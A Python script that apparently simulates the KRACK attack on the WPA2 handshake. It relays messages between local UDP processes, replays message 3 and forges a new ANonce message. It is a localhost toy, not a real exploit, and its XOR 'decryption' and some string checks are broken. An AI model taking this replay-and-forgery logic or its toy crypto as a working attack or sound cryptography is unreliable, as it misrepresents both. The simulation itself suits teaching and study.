import socket
import sys
import struct
import random

server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_socket.bind(("0.0.0.0", 19992))


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def send_client(p):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(p, ("127.0.0.1", 19991))
    s.close()
    p = p.decode("utf-8").replace("\0", "")  # Added just for clarity on the stamps
    if p != "restard":
        print("Send: %s to client\n" % p)


def send_ap(p):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(p, ("127.0.0.1", 19990))
    s.close()
    p = p.decode("utf-8").replace("\0", "")  # Added just for clarity on the stamps
    if p != "restard":
        print("Send: %s to AP\n" % p)


def send_broad(p):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(p, ("127.0.0.1", 19991))
    s.sendto(p, ("127.0.0.1", 19990))
    s.close()


def recv():
    global server_socket
    data, addr = server_socket.recvfrom(1024)
    # s = struct.unpack("!50si", data)
    s = data.decode("utf-8").replace("\0", "")
    print("Received: %s\n" % s)
    return data


def make_ptk(ANonce, SNonce):
    return ANonce + SNonce


def decrypt(ptk, e_msg):
    # msg in asci

    # xor packet key and msg
    decrypted_msg = ptk ^ int(e_msg)
    sd_msg = hex(decrypted_msg)[2:]

    msg = bytes.fromhex(sd_msg).decode('utf-8')
    if msg == 'hello':
        print("haha msg5 was decrypted  msg5:%s\n" % msg)
    else:
        print('You have defeated KRACK\n')
    return decrypted_msg


def check_packet():
    in_user = input(bcolors.OKGREEN + "Check the packet [Y] [N]\n" + bcolors.ENDC).upper()
    if in_user == "Y":  # print packet
        print("SHEEEEEEESHH")
        input(bcolors.OKGREEN + "Press any key to continue\n" + bcolors.ENDC)


if __name__ == "__main__":
    # Intercept and Send msg 1
    msg1 = recv()
    send_client(msg1)

    check_packet()
    send_broad("restart".encode())

    # Intercept and Send msg 2
    msg2 = recv()
    send_ap(msg2)

    check_packet()
    send_ap("restart".encode())

    # Intercept the first msg 3
    msg3_1 = recv()

    check_packet()
    send_ap("restart".encode())

    # Intercept the second msg 3
    msg3_2 = recv()

    check_packet()
    send_ap("restart".encode())

    # Intercept the third msg 3
    msg3_3 = recv()

    check_packet()
    send_client("restart".encode())

    # Perform the attack
    # Send the first message
    send_client(msg3_1)

    check_packet()
    send_client("restart".encode())

    # Send a forged message 1
    print('Sending a new forged ANonce to supplicant')
    send_client("Msg1(r+2)".encode())

    check_packet()
    send_client("restart".encode())

    # Send the third msg 3
    send_client(msg3_3)

    check_packet()
    send_broad("restart".encode())

    # Intercept and Send msg 4
    msg4 = recv()
    send_ap(msg4)

    check_packet()
    send_broad("restart".encode())

    # Forward the completion of the handshake and Data
    send_ap(recv())

    check_packet()
    send_broad("restart".encode())

    send_ap(recv())

    check_packet()
    send_broad("restart".encode())

    send_ap(recv())

    check_packet()
    send_broad("restart".encode())

    print("MitM Done.")
    server_socket.close()
